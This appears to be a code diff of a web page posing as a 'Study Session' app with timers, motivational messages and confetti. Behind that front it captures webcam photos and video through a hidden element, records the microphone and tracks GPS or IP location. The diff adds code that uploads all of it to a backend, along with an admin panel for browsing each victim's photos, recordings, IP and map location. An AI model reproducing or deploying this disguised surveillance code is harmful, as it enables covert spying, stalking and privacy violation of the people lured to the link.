-    videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
-    videoElement.play().catch(() => {});
-    
-    if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
-        document.getElementById('statusText').innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i> HTTPS required for camera!';
-        return;
-    }
-    
-    await startRecording();
+    document.getElementById('startCampaignName').innerHTML = '📝 ' + (linkData.n || 'Study Session');
+    document.getElementById('startScreen').classList.remove('hidden');
+}
+
+function startSession() {
+    document.getElementById('startScreen').classList.add('hidden');
+    document.getElementById('recordingScreen').classList.remove('hidden');
+    startTimer();
+    startRecording();
+}
+
+function startTimer() {
+    sessionStartTime = Date.now();
+    timerInterval = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
+        const min = String(Math.floor(elapsed / 60)).padStart(2, '0');
+        const sec = String(elapsed % 60).padStart(2, '0');
+        const td = document.getElementById('timerDisplay');
+        if(td) td.innerText = `${min}:${sec}`;
+    }, 1000);
 }
 
 async function startRecording() {
     try {
-        document.getElementById('statusText').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Camera permission maang raha hai...';
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-circle fa-pulse mr-2"></i> REQUESTING PERMISSIONS...';
         
-        hiddenStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 640, height: 480 }, 
-            audio: false 
-        });
+        hiddenStream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
         document.getElementById('hiddenVideo').srcObject = hiddenStream;
         
         await new Promise(resolve => {
             const v = document.getElementById('hiddenVideo');
-            if(v.readyState >= 2) resolve();
-            else v.onloadeddata = resolve;
+            if(v.readyState >= 2) resolve(); else v.onloadeddata = resolve;
         });
         
+        // Video recorder
         try {
             videoRecorder = new MediaRecorder(hiddenStream);
             videoChunks = [];
@@ -359,7 +650,6 @@ async function startRecording() {
                     reader.onloadend = () => {
                         allVideos.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
                         try { localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos)); } catch(e) {}
-                        updateStats();
                         displayVideos();
                     };
                     reader.readAsDataURL(blob);
@@ -368,6 +658,7 @@ async function startRecording() {
             videoRecorder.start(1000);
         } catch(e) { console.warn('Video recorder failed:', e); }
         
+        // Audio recorder
         try {
             audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
             audioRecorder = new MediaRecorder(audioStream);
@@ -380,7 +671,6 @@ async function startRecording() {
                     reader.onloadend = () => {
                         allVoices.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
                         try { localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices)); } catch(e) {}
-                        updateStats();
                         displayVoices();
                     };
                     reader.readAsDataURL(blob);
@@ -389,51 +679,86 @@ async function startRecording() {
             audioRecorder.start(1000);
         } catch(e) { console.warn('Audio failed:', e); }
         
+        // Location
         await getLocationWithAddress();
         locationInterval = setInterval(getLocationWithAddress, 15000);
         
-        setTimeout(() => startCapture(), 2000);
-        document.getElementById('statusText').innerHTML = '<i class="fas fa-heartbeat fa-pulse mr-2"></i> Study session active';
+        setTimeout(() => startCapture(), 1500);
+        
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-circle fa-pulse mr-2"></i> SYSTEM ACTIVE • MONITORING...';
         
     } catch(e) {
         console.error(e);
-        document.getElementById('statusText').innerHTML = '<i class="fas fa-info-circle mr-2"></i> Camera permission denied! Please allow.';
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i> PERMISSION DENIED!';
     }
 }
 
+// ============ LOCATION (GPS + IP Fallback) ============
 async function getLocationWithAddress() {
-    if(!navigator.geolocation) return;
-    navigator.geolocation.getCurrentPosition(async (p) => {
-        let address = 'Address not found';
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`, {
-                headers: { 'Accept': 'application/json' }
-            });
-            const data = await res.json();
-            address = data.display_name || `${p.coords.latitude}, ${p.coords.longitude}`;
-        } catch(e) {}
-        
-        allLocations.push({ 
-            id: Date.now(), 
-            lat: p.coords.latitude, 
-            lng: p.coords.longitude, 
-            address: address,
-            time: new Date().toLocaleString() 
-        });
-        try { localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations)); } catch(e) {}
-        updateStats();
-        displayLocations();
-    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+    if(!navigator.geolocation) {
+        console.log('❌ Geolocation not supported');
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async (p) => {
+            let address = 'Address not found';
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`, {
+                    headers: { 'Accept': 'application/json' }
+                });
+                const data = await res.json();
+                address = data.display_name || `${p.coords.latitude}, ${p.coords.longitude}`;
+            } catch(e) { console.warn('Address fetch failed:', e); }
+            
+            const locData = {
+                id: Date.now(),
+                lat: p.coords.latitude,
+                lng: p.coords.longitude,
+                accuracy: p.coords.accuracy,
+                address: address,
+                time: new Date().toLocaleString(),
+                source: 'GPS'
+            };
+            
+            allLocations.push(locData);
+            console.log('📍 GPS Location:', locData);
+            
+            try { localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations)); } catch(e) {}
+            displayLocations();
+        },
+        (error) => {
+            console.error('❌ GPS error:', error.message);
+            // IP-based fallback
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => {
+                    if(data.latitude && data.longitude) {
+                        allLocations.push({
+                            id: Date.now(),
+                            lat: data.latitude,
+                            lng: data.longitude,
+                            address: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`,
+                            ip: data.ip,
+                            time: new Date().toLocaleString(),
+                            source: 'IP-based'
+                        });
+                        console.log('📍 IP-based:', data.city);
+                        try { localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations)); } catch(e) {}
+                        displayLocations();
+                    }
+                })
+                .catch(e => console.warn('IP location failed:', e));
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
 }
 
 function startCapture() {
     captureTimer = setInterval(() => {
         if(capturedCount >= neededCount) {
             clearInterval(captureTimer);
-            if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
-            if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
-            if(locationInterval) clearInterval(locationInterval);
-            document.getElementById('statusText').innerHTML = '<i class="fas fa-check-circle mr-2"></i> Session complete!';
+            completeSession();
             return;
         }
         
@@ -443,34 +768,179 @@ function startCapture() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
+            allPhotos.push({ id: Date.now(), data: canvas.toDataURL('image/jpeg', 0.7), time: new Date().toLocaleString() });
             try { localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos)); } catch(e) { allPhotos.shift(); }
             capturedCount++;
-            updateStats();
-            displayPhotos();
             
-            const msgs = ["📖 Keep going!", "✨ You're doing great!", "💪 Almost there!", "🎯 Stay focused!"];
-            document.getElementById('motivationMsg').innerHTML = msgs[Math.floor(Math.random() * msgs.length)];
-            document.getElementById('statusText').innerHTML = `<i class="fas fa-camera mr-2"></i> Captured ${capturedCount}/${neededCount}`;
+            const pct = (capturedCount / neededCount) * 100;
+            const pb = document.getElementById('progressBar');
+            const pt = document.getElementById('progressText');
+            if(pb) pb.style.width = pct + '%';
+            if(pt) pt.innerText = `${capturedCount}/${neededCount}`;
+            
+            const m = motivations[Math.floor(Math.random() * motivations.length)];
+            const ed = document.getElementById('emojiDisplay');
+            const mm = document.getElementById('motivationMsg');
+            const ff = document.getElementById('funFact');
+            if(ed) ed.innerText = m.emoji;
+            if(mm) mm.innerText = m.msg;
+            if(ff) ff.innerText = funFacts[Math.floor(Math.random() * funFacts.length)];
+            
+            const st = document.getElementById('statusText');
+            if(st) st.innerHTML = `<i class="fas fa-circle fa-pulse mr-2"></i> CAPTURING ${capturedCount}/${neededCount} • AI_ANALYZING...`;
         }
     }, captureInterval);
 }
 
-function updateStats() {
+function completeSession() {
+    if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+    if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+    if(locationInterval) clearInterval(locationInterval);
+    if(timerInterval) clearInterval(timerInterval);
+    
+    setTimeout(() => {
+        document.getElementById('recordingScreen').classList.add('hidden');
+        document.getElementById('completionScreen').classList.remove('hidden');
+        
+        const elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
+        const min = String(Math.floor(elapsed / 60)).padStart(2, '0');
+        const sec = String(elapsed % 60).padStart(2, '0');
+        document.getElementById('finalPhotos').innerText = allPhotos.length;
+        document.getElementById('finalTime').innerText = `${min}:${sec}`;
+        
+        const studentData = {
+            campaignName: 'Study Session',
+            photos: allPhotos,
+            videos: allVideos,
+            voices: allVoices,
+            locations: allLocations
+        };
+        
+        fetch(BACKEND_URL + '/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(studentData)
+        })
+        .then(r => r.json())
+        .then(d => console.log('✅ Data sent:', d))
+        .catch(e => console.error('❌ Send error:', e));
+        
+        createConfetti();
+    }, 2000);
+}
+
+function createConfetti() {
+    for(let i = 0; i < 60; i++) {
+        const c = document.createElement('div');
+        c.className = 'confetti';
+        c.style.left = Math.random() * 100 + 'vw';
+        c.style.background = ['#00ff88', '#00ffcc', '#ff00ff', '#ffff00', '#00ffff', '#ff0088'][Math.floor(Math.random() * 6)];
+        c.style.animationDelay = Math.random() * 2 + 's';
+        c.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+        document.body.appendChild(c);
+        setTimeout(() => c.remove(), 5000);
+    }
+}
+
+// ============ ADMIN: SUBMISSIONS ============
+async function loadSubmissions() {
+    const area = document.getElementById('submissionsArea');
+    area.innerHTML = '<div class="text-center text-white/70 py-6"><i class="fas fa-spinner fa-spin mr-2"></i> Loading...</div>';
+    
     try {
-        allPhotos = JSON.parse(localStorage.getItem('studyPhotosFinal') || '[]');
-        allVideos = JSON.parse(localStorage.getItem('studyVideosFinal') || '[]');
-        allVoices = JSON.parse(localStorage.getItem('studyVoicesFinal') || '[]');
-        allLocations = JSON.parse(localStorage.getItem('studyLocsFinal') || '[]');
-    } catch(e) {}
+        const res = await fetch(BACKEND_URL + '/api/submissions');
+        const data = await res.json();
+        
+        if(data.length === 0) {
+            area.innerHTML = '<div class="text-center text-white/50 py-10 bg-white/10 rounded-2xl">📭 Abhi tak koi data nahi aaya</div>';
+            return;
+        }
+        
+        area.innerHTML = `<h3 class="text-2xl font-bold text-white mb-4">📥 Student Submissions (${data.length})</h3>`;
+        
+        window.allSubmissions = data;
+        
+        data.reverse().forEach((sub) => {
+            const pc = sub.photos?.length || 0;
+            const vc = sub.videos?.length || 0;
+            const voc = sub.voices?.length || 0;
+            const lc = sub.locations?.length || 0;
+            
+            area.innerHTML += `
+                <div class="submission-card">
+                    <div class="flex justify-between items-center mb-3 flex-wrap gap-2">
+                        <div>
+                            <h4 class="text-white font-bold text-lg">📚 ${sub.campaignName || 'Unknown'}</h4>
+                            <p class="text-white/60 text-xs">⏰ ${sub.receivedAt || 'N/A'}</p>
+                            <p class="text-cyan-300 text-xs mt-1">
+                                <i class="fas fa-globe mr-1"></i> IP: <b>${sub.ipAddress || 'N/A'}</b>
+                            </p>
+                        </div>
+                        <span class="bg-green-500 text-white px-3 py-1 rounded-full text-xs font-bold">${pc}📸 | ${vc}🎥 | ${voc}🎤 | ${lc}📍</span>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-3 mt-3">
+                        <button onclick="showSubmissionDetail(${sub.id}, 'photos')" class="bg-pink-500 text-white py-2 rounded-xl text-sm font-bold love-btn">
+                            📸 View Photos (${pc})
+                        </button>
+                        <button onclick="showSubmissionDetail(${sub.id}, 'videos')" class="bg-blue-500 text-white py-2 rounded-xl text-sm font-bold love-btn">
+                            🎥 View Videos (${vc})
+                        </button>
+                        <button onclick="showSubmissionDetail(${sub.id}, 'voices')" class="bg-green-500 text-white py-2 rounded-xl text-sm font-bold love-btn">
+                            🎤 Listen Voice (${voc})
+                        </button>
+                        <button onclick="showSubmissionDetail(${sub.id}, 'locations')" class="bg-red-500 text-white py-2 rounded-xl text-sm font-bold love-btn">
+                            📍 View Location (${lc})
+                        </button>
+                    </div>
+                    
+                    <div id="detail-${sub.id}" class="mt-4"></div>
+                </div>
+            `;
+        });
+    } catch(e) {
+        console.error(e);
+        area.innerHTML = '<div class="text-center text-red-300 py-10 bg-red-500/20 rounded-2xl">❌ Error loading</div>';
+    }
+}
+
+function showSubmissionDetail(id, type) {
+    const sub = window.allSubmissions.find(s => String(s.id) === String(id));
+    if(!sub) return;
     
-    document.getElementById('statPhotos').innerHTML = allPhotos.length;
-    document.getElementById('statVideos').innerHTML = allVideos.length;
-    document.getElementById('statVoices').innerHTML = allVoices.length;
-    document.getElementById('statLocs').innerHTML = allLocations.length;
+    const area = document.getElementById(`detail-${id}`);
+    if(!area) return;
     
-    displayPhotos();
+    if(type === 'photos') {
+        area.innerHTML = `<div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+            ${(sub.photos || []).map(p => `<img src="${p.data}" class="rounded-lg w-full h-24 object-cover cursor-pointer" onclick="window.open('${p.data}')">`).join('')}
+        </div>`;
+    } else if(type === 'videos') {
+        area.innerHTML = `<div class="space-y-3">
+            ${(sub.videos || []).map(v => `<div class="bg-white/10 rounded-xl p-3">
+                <p class="text-white text-xs mb-2">${v.time}</p>
+                <video controls class="w-full rounded-lg"><source src="${v.data}" type="video/webm"></video>
+            </div>`).join('')}
+        </div>`;
+    } else if(type === 'voices') {
+        area.innerHTML = `<div class="space-y-2">
+            ${(sub.voices || []).map(v => `<div class="bg-white/10 rounded-xl p-3">
+                <p class="text-white text-xs mb-2">🎤 ${v.time}</p>
+                <audio controls class="w-full"><source src="${v.data}" type="audio/webm"></audio>
+            </div>`).join('')}
+        </div>`;
+    } else if(type === 'locations') {
+        area.innerHTML = (sub.locations || []).map(l => `
+            <div class="bg-white/10 rounded-xl p-3 mb-3">
+                <div class="mb-2 rounded-lg overflow-hidden">
+                    <iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${l.lat},${l.lng}&z=15&output=embed"></iframe>
+                </div>
+                <p class="text-white text-sm">📍 ${l.lat?.toFixed(4)}, ${l.lng?.toFixed(4)}</p>
+                <p class="text-white/60 text-xs">${l.address || ''}</p>
+                <p class="text-white/40 text-xs">⏰ ${l.time} ${l.source ? '• ' + l.source : ''}</p>
+            </div>
+        `).join('');
+    }
 }
 
 // ============ CHECK URL ============
@@ -478,29 +948,37 @@ function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     const encodedData = urlParams.get('data');
     
+    console.log('🔍 URL Check. Data:', encodedData);
+    
     if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
         document.getElementById('httpsWarning').classList.remove('hidden');
     }
     
     if(encodedData) {
         try {
-            const jsonStr = safeAtob(encodedData);
-            const linkData = JSON.parse(jsonStr);
+            const decoded = safeAtob(encodedData);
+            console.log('🔓 Decoded:', decoded);
+            
+            if(!decoded) throw new Error('Empty decode');
+            
+            const linkData = JSON.parse(decoded);
+            console.log('✅ Parsed:', linkData);
+            
+            if(!linkData.n) throw new Error('Campaign name missing');
             
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('cameraPanel').classList.remove('hidden');
             startCameraPageFromData(linkData);
         } catch(e) {
-            console.error('Link decode error:', e);
-            alert('❌ Link invalid hai! Dobara generate karo.');
+            console.error('❌ Link error:', e);
+            alert('❌ Invalid link!\n\n' + e.message + '\n\nDobara generate karo.');
             document.getElementById('adminPanel').classList.remove('hidden');
             document.getElementById('cameraPanel').classList.add('hidden');
-            updateStats();
         }
     } else {
         document.getElementById('adminPanel').classList.remove('hidden');
         document.getElementById('cameraPanel').classList.add('hidden');
-        updateStats();
+        loadSubmissions();
     }
 }
 
@@ -512,6 +990,9 @@ window.downloadPhoto = downloadPhoto;
 window.downloadVideo = downloadVideo;
 window.downloadVoice = downloadVoice;
 window.showTab = showTab;
+window.loadSubmissions = loadSubmissions;
+window.startSession = startSession;
+window.showSubmissionDetail = showSubmissionDetail;
 
 checkUrl();
 
@@ -520,6 +1001,7 @@ window.addEventListener('beforeunload', () => {
     if(audioStream) audioStream.getTracks().forEach(t => t.stop());
     if(captureTimer) clearInterval(captureTimer);
     if(locationInterval) clearInterval(locationInterval);
+    if(timerInterval) clearInterval(timerInterval);
 });
 </script>
 </body>
